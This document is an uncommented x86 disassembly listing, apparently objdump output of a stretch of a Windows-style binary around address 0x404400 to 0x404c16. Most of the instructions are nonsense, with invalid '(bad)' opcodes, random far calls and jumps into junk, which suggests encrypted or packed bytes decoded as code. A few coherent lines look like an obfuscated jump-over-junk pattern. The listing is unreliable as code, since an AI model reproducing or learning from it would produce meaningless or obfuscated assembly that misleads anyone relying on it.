  40446b:	shl    BYTE PTR [edi+0x5d],1
  40446e:	xlat   BYTE PTR gs:[ebx]
  404470:	fs jnp 0x4044b7
  404473:	leave  
  404474:	cmp    BYTE PTR [edi+eax*8],bl
  404477:	jnp    0x4044d5
  404479:	pop    ecx
  40447a:	ins    BYTE PTR es:[edi],dx
  40447b:	(bad)  
  40447c:	call   0x90d950bd
  404481:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404482:	xor    DWORD PTR [edx-0x45],0xffffffd1
  404486:	jne    0x404480
  404488:	dec    esp
  404489:	jle    0x404508
  40448b:	icebp  
  40448c:	pop    es
  40448d:	out    0xd3,al
  40448f:	in     al,dx
  404490:	imul   edx,DWORD PTR [edx+0x67],0x86d3a4e2
  404497:	xchg   esp,eax
  404498:	mov    eax,0xe1088bc
  40449d:	or     al,0x98
  40449f:	aad    0x36
  4044a1:	mov    eax,0x65a10d81
  4044a6:	je     0x404440
  4044a8:	dec    ebp
  4044a9:	sti    
  4044aa:	sbb    BYTE PTR [ebx],0x35
  4044ad:	xor    BYTE PTR [edi+0x2f870408],0xe9
  4044b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044b5:	aas    
  4044b6:	out    dx,al
  4044b7:	cmp    DWORD PTR [eax+0x4a],ebp
  4044ba:	push   ss
  4044bb:	cmp    dl,BYTE PTR [eax+0x7a669c71]
  4044c1:	loope  0x404478
  4044c3:	jne    0x4044df
  4044c5:	retf   0xe308
  4044c8:	push   ss
  4044c9:	cmc    
  4044ca:	push   cs
  4044cb:	pop    esi
  4044cc:	push   esp
  4044cd:	xchg   esi,eax
  4044ce:	pop    eax
  4044cf:	nop
  4044d0:	and    bh,BYTE PTR [esi]
  4044d2:	into   
  4044d3:	repnz call FWORD PTR [edx-0x2f]
  4044d7:	call   0x952cb218
  4044dc:	dec    sp
  4044de:	mov    DWORD PTR ds:0xa68b944e,esp
  4044e4:	sub    al,0xed
  4044e6:	div    DWORD PTR [eax+0x7f722dd5]
  4044ec:	sar    DWORD PTR [esi],0xb5
  4044ef:	or     eax,0xb4d95acc
  4044f4:	cs stc 
  4044f6:	dec    esp
  4044f7:	in     eax,dx
  4044f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044f9:	repnz mov al,ds:0x11c28499
  404500:	push   0xe
  404502:	enter  0x5894,0x82
  404506:	mov    edi,0x54c4b651
  40450b:	repz mov ds:0xff487f9c,al
  404511:	push   ds
  404512:	call   0x1d7:0x35b0b150
  404519:	cmp    eax,0x6fb2c08c
  40451e:	into   
  40451f:	fs mov bl,0x96
  404522:	cs jae 0x4044ad
  404525:	xchg   esi,eax
  404526:	push   edx
  404527:	les    ecx,FWORD PTR [ecx]
  404529:	scas   al,BYTE PTR es:[edi]
  40452a:	inc    eax
  40452b:	mov    ebp,0x1203907
  404530:	dec    eax
  404531:	sahf   
  404532:	call   0x4ea3d447
  404537:	aad    0x51
  404539:	inc    ebp
  40453a:	xchg   ecx,eax
  40453b:	aad    0x52
  40453d:	mov    ch,0x54
  40453f:	sbb    dh,BYTE PTR [eax]
  404541:	das    
  404542:	out    0x32,al
  404544:	loopne 0x40455a
  404546:	in     eax,0xaa
  404548:	das    
  404549:	mov    ecx,DWORD PTR [esi]
  40454b:	mov    eax,0xdf18e18
  404550:	lahf   
  404551:	into   
  404552:	adc    BYTE PTR ds:0x1e6c3cd5,al
  404558:	push   ds
  404559:	mov    edi,0x697438f5
  40455e:	xchg   ebp,eax
  40455f:	add    eax,0xe535e3b6
  404564:	jae    0x40455f
  404566:	mov    edx,eax
  404568:	inc    edi
  404569:	lock mov ebx,DWORD PTR [esp+edx*4]
  40456d:	add    ch,BYTE PTR [edx+0x4d]
  404570:	cwde   
  404571:	jnp    0x4045e4
  404573:	mov    cl,0x87
  404575:	repnz mov BYTE PTR [esi-0x2d],ah
  404579:	fcom   DWORD PTR [ebp+eiz*8-0x5925763b]
  404580:	sub    BYTE PTR [ebp-0x76],ah
  404583:	mov    dl,ah
  404585:	test   DWORD PTR [edx+0x42],ecx
  404588:	push   eax
  404589:	push   esi
  40458a:	sub    bh,BYTE PTR [eax+0x36805cbf]
  404590:	jmp    0x8c41d81f
  404595:	jo     0x4045cb
  404597:	xor    al,0x23
  404599:	pop    esp
  40459a:	in     al,0x53
  40459c:	cmp    eax,esp
  40459e:	push   es
  40459f:	in     eax,0x62
  4045a1:	jl     0x40457b
  4045a3:	dec    ebx
  4045a4:	in     al,0x25
  4045a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045a7:	ror    BYTE PTR cs:[ebx-0x36],1
  4045ab:	push   ss
  4045ac:	es xchg esp,eax
  4045ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045af:	push   ds
  4045b0:	das    
  4045b1:	jne    0x404631
  4045b3:	(bad)  
  4045b4:	outs   dx,BYTE PTR ds:[esi]
  4045b5:	ds jle 0x404562
  4045b8:	sbb    al,0x58
  4045ba:	lods   eax,DWORD PTR ds:[esi]
  4045bb:	idiv   DWORD PTR [eax-0x324ec715]
  4045c1:	xchg   ecx,eax
  4045c2:	and    al,BYTE PTR [eax-0x174b87ca]
  4045c8:	or     dh,BYTE PTR [edi-0x35c1ffb2]
  4045ce:	(bad)  
  4045d0:	add    BYTE PTR [ebp-0x3d],cl
  4045d3:	test   eax,0x71b86932
  4045d8:	inc    edx
  4045d9:	(bad)  
  4045da:	mov    eax,ds:0x84bd2a30
  4045df:	jno    0x40462b
  4045e1:	pop    esi
  4045e2:	arpl   WORD PTR [eax+0x5c],di
  4045e5:	outs   dx,BYTE PTR ds:[esi]
  4045e6:	(bad)  
  4045e7:	out    dx,eax
  4045e8:	imul   edx,DWORD PTR [esi],0xd2e7d743
  4045ee:	sub    BYTE PTR [ebp+0x48],ch
  4045f1:	mov    cl,dl
  4045f3:	jge    0x404655
  4045f5:	inc    DWORD PTR [edi+0x58c9c76e]
  4045fb:	sbb    BYTE PTR [edi-0x3f],bh
  4045fe:	adc    cl,BYTE PTR [esi-0x4d]
  404601:	adc    dl,BYTE PTR [ebx-0x61]
  404604:	ss daa 
  404606:	int    0xe6
  404608:	iret   
  404609:	xor    al,0x3e
  40460b:	lods   al,BYTE PTR ds:[esi]
  40460c:	xchg   ebx,eax
  40460d:	mov    eax,DWORD PTR [eiz*4-0x43f0ff4f]
  404614:	pop    eax
  404615:	fcomp  st(2)
  404617:	push   0x56
  404619:	popa   
  40461a:	sub    eax,0xe3a0b20b
  40461f:	pop    eax
  404620:	ret    
  404621:	jae    0x40460e
  404623:	iret   
  404624:	xchg   edi,eax
  404625:	xor    DWORD PTR [esi],ebx
  404627:	mov    al,ds:0x4e552255
  40462c:	pop    DWORD PTR [ecx+0x18]
  40462f:	aaa    
  404630:	push   esi
  404631:	or     esi,DWORD PTR [ecx]
  404633:	inc    eax
  404634:	xchg   ebp,eax
  404635:	in     eax,dx
  404636:	pop    es
  404637:	sbb    esi,DWORD PTR [ecx-0x1b14b1bd]
  40463d:	jno    0x4045f1
  40463f:	bound  ecx,QWORD PTR [edx-0x51]
  404642:	imul   edi,DWORD PTR ds:0xf597413a,0x3b
  404649:	test   eax,0x46dac0b6
  40464e:	mov    edi,0xf973db02
  404653:	(bad)  [edx]
  404655:	js     0x404687
  404657:	into   
  404658:	dec    ebp
  404659:	cs rol eax,1
  40465c:	jae    0x404605
  40465e:	mov    ds:0xe6c5925c,eax
  404663:	icebp  
  404664:	sar    ch,0xa7
  404667:	or     BYTE PTR [edx-0x2c],ch
  40466a:	push   esp
  40466b:	xor    BYTE PTR [edi],bl
  40466d:	jge    0x4046da
  40466f:	imul   ecx,edi,0x5b6a5db1
  404675:	sub    dh,BYTE PTR [edi-0x5ae8cffa]
  40467b:	cwde   
  40467c:	mov    ds:0x1ab592c0,al
  404681:	mov    ch,0xdc
  404683:	and    edi,esi
  404685:	cmp    edx,DWORD PTR [eax-0x7dbc9973]
  40468b:	(bad)  
  40468c:	call   0xf2d0:0x29606dab
  404693:	js     0x4046d0
  404695:	mov    WORD PTR [ebx],fs
  404697:	xchg   edi,eax
  404698:	adc    ebx,edi
  40469a:	in     eax,dx
  40469b:	out    0x38,eax
  40469d:	bound  ebp,QWORD PTR [ebp+esi*8-0x7f1e7389]
  4046a4:	mov    ch,0x28
  4046a6:	aas    
  4046a7:	and    edx,DWORD PTR [ebx-0x193659a0]
  4046ad:	dec    ebx
  4046ae:	mov    cl,0x5
  4046b0:	retf   
  4046b1:	std    
  4046b2:	daa    
  4046b3:	inc    ecx
  4046b4:	(bad)  
  4046b5:	and    DWORD PTR [edx-0x2c777424],ecx
  4046bb:	ins    BYTE PTR es:[edi],dx
  4046bc:	adc    eax,0x8762eb7e
  4046c1:	dec    ecx
  4046c2:	add    DWORD PTR [esi+0x33],edx
  4046c5:	sti    
  4046c6:	fild   DWORD PTR [edi-0x4a]
  4046c9:	mov    ds:0x3e442fde,eax
  4046ce:	xchg   esp,eax
  4046cf:	daa    
  4046d0:	mov    dl,ch
  4046d2:	push   edx
  4046d3:	cmp    bl,BYTE PTR [eax+esi*4]
  4046d6:	or     al,0x6b
  4046d8:	push   ss
  4046d9:	repz mov dl,0x9a
  4046dc:	movsx  ecx,BYTE PTR [edx]
  4046df:	jns    0x404693
  4046e1:	aas    
  4046e2:	sbb    DWORD PTR [ebp+0x19],edx
  4046e5:	lea    edx,[eax]
  4046e7:	mov    dh,BYTE PTR [ebx-0x1d]
  4046ea:	and    eax,0xfb562045
  4046ef:	das    
  4046f0:	ins    DWORD PTR es:[edi],dx
  4046f1:	jmp    0x4f61:0xd8d1e7a6
  4046f8:	(bad)  
  4046f9:	lods   eax,DWORD PTR ds:[esi]
  4046fa:	adc    cx,WORD PTR [ecx+0x114b3ab7]
  404701:	fs leave 
  404703:	adc    ch,al
  404705:	mov    edi,0x3c70df3d
  40470a:	gs gs jge 0x404704
  40470e:	mov    edx,0x2a7eb85f
  404713:	ret    
  404714:	inc    ebx
  404715:	out    dx,eax
  404716:	std    
  404717:	mov    eax,ds:0x9313d1fc
  40471c:	bnd jb 0x404723
  40471f:	jnp    0x4046fd
  404721:	inc    edx
  404722:	xchg   ebx,eax
  404723:	idiv   DWORD PTR [esi-0x49]
  404726:	sub    DWORD PTR [ecx-0x523f4916],edi
  40472c:	adc    al,0x1a
  40472e:	cmp    edi,edx
  404730:	int    0xf1
  404732:	frstor [edi+0x28]
  404735:	or     esp,DWORD PTR [edi+0x53]
  404738:	das    
  404739:	out    dx,eax
  40473a:	icebp  
  40473b:	adc    DWORD PTR [edi],ecx
  40473d:	lods   al,BYTE PTR ds:[esi]
  40473e:	rol    DWORD PTR [edx],1
  404740:	or     DWORD PTR ds:0x428253,0x42820f
  40474a:	shr    edx,0x2
  40474d:	mov    edx,DWORD PTR ds:0x42822f
  404753:	or     DWORD PTR ds:0x42832f,edx
  404759:	mov    DWORD PTR [ebp-0x1c],ecx
  40475c:	jmp    0x404b3a
  404761:	add    al,0x2a
  404763:	lea    edi,[eax+0x1a]
  404766:	fcomp  QWORD PTR ss:[edx]
  404769:	pop    edi
  40476a:	or     al,0x3f
  40476c:	mov    esi,0x6a499b29
  404771:	fcmovnb st,st(7)
  404773:	sbb    BYTE PTR [eax],bl
  404775:	sahf   
  404776:	adc    bl,BYTE PTR [eax]
  404778:	sbb    BYTE PTR [edi+0x53],bh
  40477b:	int3   
  40477c:	es sub eax,0x42f05993
  404782:	into   
  404783:	clc    
  404784:	jle    0x404782
  404786:	mov    al,0xdc
  404788:	(bad)  
  404789:	retf   
  40478a:	jb     0x4047e0
  40478c:	(bad)  
  40478d:	mov    ebx,0xfef3d71d
  404792:	(bad)
  404795:	bnd jle 0x4047d6
  404798:	iret   
  404799:	imul   eax,DWORD PTR cs:[edx+0x79],0x32
  40479e:	push   edx
  40479f:	mov    ds:0x19bf065f,al
  4047a4:	call   0x1066740e
  4047a9:	sbb    eax,0x30945a0
  4047ae:	mov    ch,BYTE PTR [edi]
  4047b0:	or     al,0xf3
  4047b2:	mov    ecx,0xd082dbe9
  4047b7:	pop    ss
  4047b8:	call   DWORD PTR [ebp+0x4c]
  4047bb:	inc    esp
  4047bc:	sbb    BYTE PTR [edx],bh
  4047be:	test   eax,0xcda0b433
  4047c3:	icebp  
  4047c4:	pop    esi
  4047c5:	jae    0x404814
  4047c7:	xchg   edi,eax
  4047c8:	outs   dx,BYTE PTR ds:[esi]
  4047c9:	dec    edi
  4047ca:	add    dl,BYTE PTR [esi]
  4047cc:	pop    ebp
  4047cd:	lds    ebx,FWORD PTR [ebp-0x44056ecb]
  4047d3:	push   edx
  4047d4:	stc    
  4047d5:	sbb    ebx,DWORD PTR [ecx]
  4047d7:	xchg   esp,eax
  4047d8:	ins    DWORD PTR es:[edi],dx
  4047d9:	neg    BYTE PTR [ebp-0x7ac5cfde]
  4047df:	pop    es
  4047e0:	pop    ecx
  4047e1:	pmulhuw mm2,mm2
  4047e4:	push   edi
  4047e5:	mov    bh,BYTE PTR gs:0x6b2945f1
  4047ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047ed:	out    0xb9,al
  4047ef:	mov    ecx,ecx
  4047f1:	mov    ah,0xb9
  4047f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047f4:	jo     0x4047d4
  4047f6:	nop
  4047f7:	loope  0x4047c9
  4047f9:	jo     0x404818
  4047fb:	imul   edi,DWORD PTR [ebx],0x1929f252
  404801:	jmp    DWORD PTR [ebp-0x31c9342]
  404807:	stc    
  404808:	in     eax,0x10
  40480a:	add    al,bl
  40480c:	pop    DWORD PTR [esp+eax*1-0x41d4c94b]
  404813:	push   ebp
  404814:	mov    edx,0xe7ce91f8
  404819:	pop    ecx
  40481a:	inc    ebp
  40481b:	and    BYTE PTR [edi+esi*1],al
  40481e:	mov    al,dl
  404820:	ret    
  404821:	dec    esi
  404822:	jecxz  0x4047ff
  404824:	hlt    
  404825:	mov    esp,0x2857bd49
  40482a:	sti    
  40482b:	int3   
  40482c:	rcr    esi,cl
  40482e:	fs nop
  404830:	sub    cl,0xac
  404833:	push   ebp
  404834:	retf   0x6907
  404837:	adc    DWORD PTR [ecx],esi
  404839:	pop    esi
  40483a:	aad    0xdb
  40483c:	sbb    BYTE PTR [eax],cl
  40483e:	pop    ebx
  40483f:	mov    ebx,0x40ee9e3e
  404844:	mov    esp,0xbdc78765
  404849:	inc    edi
  40484a:	cwde   
  40484b:	pop    edx
  40484c:	pushf  
  40484d:	add    ecx,ecx
  40484f:	cwde   
  404850:	jmp    0x79a9fb81
  404855:	lods   al,BYTE PTR ds:[esi]
  404856:	je     0x40483f
  404858:	leave  
  404859:	js     0x4048c0
  40485b:	fwait
  40485c:	pop    esi
  40485d:	(bad)  
  40485e:	sbb    al,al
  404860:	push   es
  404861:	xor    edi,DWORD PTR [ebx-0x11cde18e]
  404867:	std    
  404868:	cmp    bh,dl
  40486a:	ds inc esp
  40486c:	leave  
  40486d:	loope  0x404894
  40486f:	jb     0x404847
  404871:	popa   
  404872:	ds push esp
  404874:	push   edi
  404875:	pushf  
  404876:	leave  
  404877:	mov    dl,0xd8
  404879:	(bad)
  40487c:	and    bh,BYTE PTR [eax-0xf9f039f]
  404882:	add    eax,0x9f4828e6
  404887:	push   esp
  404888:	repnz outs dx,BYTE PTR ds:[esi]
  40488a:	nop
  40488b:	mov    al,0xd9
  40488d:	(bad)  
  40488f:	test   DWORD PTR [eax+0x58],edx
  404892:	ror    BYTE PTR [edx-0x4a],cl
  404895:	into   
  404896:	inc    eax
  404897:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404898:	adc    al,0x43
  40489a:	and    ah,BYTE PTR [ecx-0x43]
  40489d:	dec    ecx
  40489e:	lods   eax,DWORD PTR ds:[esi]
  40489f:	not    dh
  4048a1:	test   DWORD PTR [ebp+ecx*1+0x21],eax
  4048a5:	add    al,0x7
  4048a7:	pop    eax
  4048a8:	jmp    0x819d:0x740c7b36
  4048af:	adc    eax,0xd7fda7be
  4048b4:	(bad)  
  4048b5:	loope  0x404904
  4048b7:	xor    edi,esi
  4048b9:	pop    esi
  4048ba:	in     eax,dx
  4048bb:	je     0x4048c6
  4048bd:	retf   
  4048be:	and    DWORD PTR [edi+0x7b],0x48
  4048c2:	jl     0x40485f
  4048c4:	pop    ebp
  4048c5:	and    eax,0xdd97c0af
  4048ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048cb:	pop    ebp
  4048cc:	adc    cl,BYTE PTR [edi-0x3b]
  4048cf:	popf   
  4048d0:	scas   eax,DWORD PTR es:[edi]
  4048d1:	scas   eax,DWORD PTR es:[edi]
  4048d2:	es mov bl,0xb6
  4048d5:	inc    ebx
  4048d6:	nop
  4048d7:	arpl   WORD PTR [edx+0x71],sp
  4048da:	xchg   ebp,eax
  4048db:	dec    eax
  4048dc:	pop    edx
  4048dd:	scas   eax,DWORD PTR es:[edi]
  4048de:	test   DWORD PTR [ebx+0x3a4f3b55],ebp
  4048e4:	stos   BYTE PTR es:[edi],al
  4048e5:	or     DWORD PTR [esi],ebp
  4048e7:	(bad)  
  4048e8:	cmp    ebp,edi
  4048ea:	arpl   WORD PTR [eax+0x1d],si
  4048ed:	pop    ecx
  4048ee:	xchg   ecx,eax
  4048ef:	dec    edx
  4048f0:	mov    esi,DWORD PTR [ebx+0x25]
  4048f3:	loopne 0x4048c9
  4048f5:	and    esi,DWORD PTR [ecx]
  4048f7:	mov    edi,DWORD PTR [ebp+eax*8+0x33bed6b3]
  4048fe:	aam    0x18
  404900:	nop
  404901:	ror    esi,1
  404903:	ja     0x4048a8
  404905:	mov    eax,0xc3e81837
  40490a:	inc    eax
  40490b:	xor    al,0x8b
  40490d:	sbb    al,BYTE PTR [ebp+0x74]
  404910:	push   eax
  404911:	inc    ebp
  404912:	xchg   edi,eax
  404913:	repz pop esp
  404915:	les    ebx,FWORD PTR [ecx-0x2c]
  404918:	dec    ecx
  404919:	fnsetpm(287 only) 
  40491b:	dec    esi
  40491c:	push   0x37
  40491e:	cmc    
  40491f:	inc    esi
  404920:	stos   BYTE PTR es:[edi],al
  404921:	outs   dx,BYTE PTR ds:[esi]
  404922:	nop
  404923:	dec    cx
  404925:	test   DWORD PTR [ecx+0x7],0xa34f481e
  40492c:	push   0xffffffe2
  40492e:	arpl   ax,si
  404930:	xor    ch,BYTE PTR [eax]
  404932:	pop    ebx
  404933:	or     BYTE PTR [ebx+0x62],ch
  404936:	clc    
  404937:	cwde   
  404938:	cdq    
  404939:	popf   
  40493a:	push   eax
  40493b:	sti    
  40493c:	ja     0x404938
  40493e:	fistp  WORD PTR [edx+0x2d]
  404941:	(bad)  
  404942:	inc    ebx
  404943:	pop    ss
  404944:	mov    eax,0xfd1aec8a
  404949:	call   0x2884:0x7ee05aa7
  404950:	sar    DWORD PTR [ebp-0x1fa32ab5],0xae
  404957:	xchg   ebx,eax
  404958:	or     al,dh
  40495a:	clc    
  40495b:	xchg   ebp,eax
  40495c:	pop    ebx
  40495d:	loopne 0x40490c
  40495f:	or     BYTE PTR [ebx+0x35],cl
  404962:	mov    ah,0x5e
  404964:	xchg   DWORD PTR [esi],ebp
  404966:	(bad)  
  404967:	stc    
  404968:	mov    dh,0xbb
  40496a:	xor    ch,BYTE PTR [edi-0x2]
  40496d:	jns    0x404991
  40496f:	and    edx,0x35
  404972:	adc    ch,BYTE PTR [eax]
  404974:	adc    cl,BYTE PTR [edi-0xb]
  404977:	pop    es
  404978:	mov    bl,0xc4
  40497a:	mov    al,ds:0xa62646e6
  40497f:	in     al,dx
  404980:	mov    ds:0x7a72b3db,eax
  404985:	push   ebx
  404986:	jbe    0x4049e1
  404988:	or     edx,eax
  40498a:	pop    esi
  40498b:	ror    DWORD PTR ds:0x5ee97d4d,cl
  404991:	push   edi
  404992:	icebp  
  404993:	dec    ebx
  404994:	inc    edx
  404995:	add    cl,dl
  404997:	mov    ebp,DWORD PTR [ecx-0x224f2d16]
  40499d:	push   cs
  40499e:	inc    ebp
  40499f:	or     DWORD PTR [ebx+0x4d500c9f],ebp
  4049a5:	cmp    DWORD PTR [ecx],edi
  4049a7:	int    0x8c
  4049a9:	add    al,BYTE PTR ds:0xec5adb9d
  4049af:	sti    
  4049b0:	nop    edi
  4049b3:	shl    DWORD PTR [esi-0xb],1
  4049b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049b7:	out    0x4b,al
  4049b9:	aaa    
  4049ba:	sbb    al,0x27
  4049bc:	push   ecx
  4049bd:	mov    esi,0x38ec8650
  4049c2:	pop    ss
  4049c3:	(bad)  
  4049c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049c5:	sbb    ecx,ecx
  4049c7:	lahf   
  4049c8:	lea    esi,[ebp-0x168ab5c0]
  4049ce:	sar    DWORD PTR [ecx],cl
  4049d0:	mov    eax,0x5f896ff4
  4049d5:	dec    ebx
  4049d6:	push   edx
  4049d7:	cmp    esp,DWORD PTR [esi+0x6ea6eda]
  4049dd:	jae    0x4049a6
  4049df:	push   esp
  4049e0:	test   DWORD PTR [ebx],edi
  4049e2:	lods   eax,DWORD PTR ds:[esi]
  4049e3:	aas    
  4049e4:	inc    ecx
  4049e5:	call   0x1511:0xc7856b6b
  4049ec:	jp     0x404a0d
  4049ee:	sbb    ebp,DWORD PTR [ebx+0x31fa4779]
  4049f4:	dec    ebp
  4049f5:	jnp    0x404a5e
  4049f7:	adc    al,0xf7
  4049f9:	xchg   BYTE PTR [edx],cl
  4049fb:	sub    al,0x5b
  4049fd:	test   eax,0xbc1f1887
  404a02:	push   edi
  404a03:	bndldx (bad),[esi]
  404a06:	pop    ebx
  404a07:	imul   eax,DWORD PTR [ebp-0x1a9af63a],0xfffffff3
  404a0e:	inc    ebp
  404a0f:	retf   0x8012
  404a12:	les    edx,FWORD PTR [ecx+0x1972d7dc]
  404a18:	or     BYTE PTR [esi],bl
  404a1a:	gs inc bl
  404a1d:	pop    ds
  404a1e:	(bad)  
  404a20:	std    
  404a21:	cmp    DWORD PTR [esi-0x63457322],eax
  404a27:	xchg   edi,eax
  404a28:	mov    WORD PTR [esp+ecx*1+0x17],ds
  404a2c:	and    DWORD PTR [edx],ebx
  404a2e:	or     dh,BYTE PTR [edx-0x7a]
  404a31:	ss dec ebp
  404a33:	std    
  404a34:	mov    es,ebx
  404a36:	call   0x5850:0xd8546a5c
  404a3d:	clc    
  404a3e:	int3   
  404a3f:	in     al,dx
  404a40:	test   DWORD PTR [edi+0x3e],ebx
  404a43:	xor    DWORD PTR [ebx],ecx
  404a45:	je     0x404a76
  404a47:	fdivr  QWORD PTR ds:0xd4878e6f
  404a4d:	inc    edx
  404a4e:	mov    esi,0x4bf9b84f
  404a53:	cmp    eax,0x14a680df
  404a58:	daa    
  404a59:	sub    esi,DWORD PTR [edi]
  404a5b:	test   eax,0xe3a0aa39
  404a60:	cwde   
  404a61:	(bad)  
  404a62:	sub    BYTE PTR [ecx-0xe],dl
  404a65:	jmp    0xab0d:0x43a0cadb
  404a6c:	repnz push ecx
  404a6e:	sbb    DWORD PTR [edx],ecx
  404a70:	lahf   
  404a71:	xchg   DWORD PTR [edi-0xe171e3e],ebp
  404a77:	outs   dx,DWORD PTR ds:[esi]
  404a78:	stos   BYTE PTR es:[edi],al
  404a79:	mov    bh,bh
  404a7b:	mov    edi,0xe24a8612
  404a80:	stc    
  404a81:	test   al,0x48
  404a83:	les    ecx,FWORD PTR [edx-0x66]
  404a86:	mov    edx,0x78efd6ea
  404a8b:	sub    eax,0x316954dd
  404a90:	xchg   ecx,eax
  404a91:	pop    ss
  404a92:	pop    eax
  404a93:	adc    DWORD PTR [edx+0xe],edi
  404a96:	sbb    eax,0x26a55798
  404a9b:	mov    edi,0x413fd526
  404aa0:	(bad)  
  404aa1:	push   edx
  404aa2:	xchg   edi,eax
  404aa3:	lahf   
  404aa4:	loop   0x404a98
  404aa6:	les    eax,FWORD PTR [ebx]
  404aa8:	xor    dh,BYTE PTR [edx-0x11]
  404aab:	out    dx,eax
  404aac:	dec    bp
  404aae:	ins    BYTE PTR es:[edi],dx
  404aaf:	cmp    eax,0xf9f42fbc
  404ab4:	mov    bl,0xb0
  404ab6:	(bad)  
  404ab8:	or     al,0x34
  404aba:	sub    eax,ebp
  404abc:	jge    0x404b3a
  404abe:	shl    DWORD PTR [esi-0x4f],1
  404ac1:	stc    
  404ac2:	fcmovu st,st(0)
  404ac4:	paddw  mm1,QWORD PTR [edi]
  404ac7:	xor    al,cl
  404ac9:	jo     0x404a55
  404acb:	mov    al,ds:0xf9e252ce
  404ad0:	sti    
  404ad1:	(bad)  
  404ad2:	jae    0x404b41
  404ad4:	scas   eax,DWORD PTR es:[edi]
  404ad5:	xor    al,0xae
  404ad7:	xlat   BYTE PTR ds:[ebx]
  404ad8:	xchg   ecx,eax
  404ad9:	add    DWORD PTR ds:0x18db11c3,eax
  404adf:	cdq    
  404ae0:	mov    ds:0x7ffd7af1,al
  404ae5:	xlat   BYTE PTR ds:[ebx]
  404ae6:	stos   BYTE PTR es:[edi],al
  404ae7:	push   0x916ecabf
  404aec:	cld    
  404aed:	pop    ecx
  404aee:	inc    ebp
  404aef:	test   eax,0x943534a9
  404af4:	(bad)  
  404af5:	call   0xb680f7ab
  404afa:	test   al,0x31
  404afc:	or     dh,BYTE PTR ds:0x7bd8b36f
  404b02:	(bad)  
  404b03:	std    
  404b04:	xchg   BYTE PTR [edi+0x766a1842],ch
  404b0a:	add    eax,0xee302e72
  404b0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b10:	cwde   
  404b11:	xor    eax,0x8ffde3dd
  404b16:	cdq    
  404b17:	mov    edi,0x1fe09016
  404b1c:	inc    ebp
  404b1d:	mov    ds:0x96ee1b2d,eax
  404b22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b23:	(bad)  
  404b24:	iret   
  404b25:	retf   
  404b26:	dec    ebx
  404b27:	fdiv   st(6),st
  404b29:	mov    ds:0x79756606,eax
  404b2e:	pop    ebp
  404b2f:	push   edi
  404b30:	add    ecx,DWORD PTR [ebp-0x78]
  404b33:	retf   
  404b34:	sbb    dl,BYTE PTR ds:0x26811391
  404b3a:	mov    ecx,DWORD PTR [ebx]
  404b3c:	mov    edx,DWORD PTR [ebx+0x4]
  404b3f:	xor    DWORD PTR [ebp-0x1c],edi
  404b42:	add    DWORD PTR ds:0x428243,0x4282b7
  404b4c:	xor    edx,edx
  404b4e:	jmp    0x404f2c
  404b53:	scas   al,BYTE PTR es:[edi]
  404b54:	ds out dx,al
  404b56:	and    ebx,DWORD PTR [edi+0x22]
  404b59:	sbb    bh,BYTE PTR [edx]
  404b5b:	fsubp  st(5),st
  404b5d:	push   ebx
  404b5e:	stos   BYTE PTR es:[edi],al
  404b5f:	sub    BYTE PTR [eax-0x3e9f4f3f],dl
  404b65:	sbb    BYTE PTR [eax],bl
  404b67:	sahf   
  404b68:	adc    bl,BYTE PTR [eax]
  404b6a:	sbb    BYTE PTR [ecx+0x7b31aeff],al
  404b70:	or     ebx,edx
  404b72:	scas   al,BYTE PTR es:[edi]
  404b73:	xchg   al,cl
  404b75:	mov    eax,0xdbfae07c
  404b7a:	ja     0x404ba9
  404b7c:	jmp    0xd0fa6309
  404b81:	std    
  404b82:	xchg   BYTE PTR [eax-0x8],cl
  404b85:	add    eax,0xfa914a9d
  404b8a:	cwde   
  404b8b:	sti    
  404b8c:	daa    
  404b8d:	fadd   DWORD PTR [edx]
  404b8f:	inc    ebp
  404b90:	xchg   ebp,eax
  404b91:	push   cs
  404b92:	cld    
  404b93:	cmp    ebp,ebp
  404b95:	mov    esp,0xb5713e0b
  404b9a:	or     eax,0x7a04c5c
  404b9f:	sub    bl,ah
  404ba1:	and    dh,BYTE PTR [esi+0x1c]
  404ba4:	push   ecx
  404ba5:	fdiv   QWORD PTR [ebp+eiz*1-0x75]
  404ba9:	mov    BYTE PTR [ecx-0x438194ee],cl
  404baf:	dec    esi
  404bb0:	push   esp
  404bb1:	lock out dx,eax
  404bb3:	mov    ebp,0xc735f237
  404bb8:	mov    cl,0x36
  404bba:	adc    al,0x90
  404bbc:	ret    0x4a87
  404bbf:	lds    edi,FWORD PTR [ebp+0x49]
  404bc2:	xchg   BYTE PTR [ebx-0x5c61fc83],bh
  404bc8:	pop    ds
  404bc9:	pop    eax
  404bca:	jae    0x404bdd
  404bcc:	xchg   esp,eax
  404bcd:	pusha  
  404bce:	sbb    esp,edi
  404bd0:	xchg   ebx,eax
  404bd1:	dec    edx
  404bd2:	adc    eax,0x88a84f76
  404bd7:	ret    
  404bd8:	loope  0x404c2a
  404bda:	addr16 aam 0xef
  404bdd:	imul   edi,DWORD PTR [ecx],0xffffffaa
  404be0:	xor    al,0x5f
  404be2:	dec    ebx
  404be3:	inc    ebx
  404be4:	outs   dx,BYTE PTR ds:[esi]
  404be5:	jg     0x404bb0
  404be7:	mov    ah,0x30
  404be9:	fwait
  404bea:	es popa 
  404bec:	dec    esi
  404bed:	shl    eax,cl
  404bef:	(bad)  [eax-0x5d20f09a]
  404bf5:	aam    0x51
  404bf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bf8:	xchg   ebp,eax
  404bf9:	dec    edi
  404bfa:	xchg   ecx,eax
  404bfb:	adc    cl,BYTE PTR [edx+0x27a0f225]
  404c01:	or     BYTE PTR [eax+edx*2+0x36],cl
  404c05:	stos   DWORD PTR es:[edi],eax
  404c06:	retf   0x4330
  404c09:	xor    al,0x82
  404c0b:	out    0xda,eax
  404c0d:	and    DWORD PTR [eax],0xb8510eef
  404c13:	retf   0x777e
  404c16:	cwde   
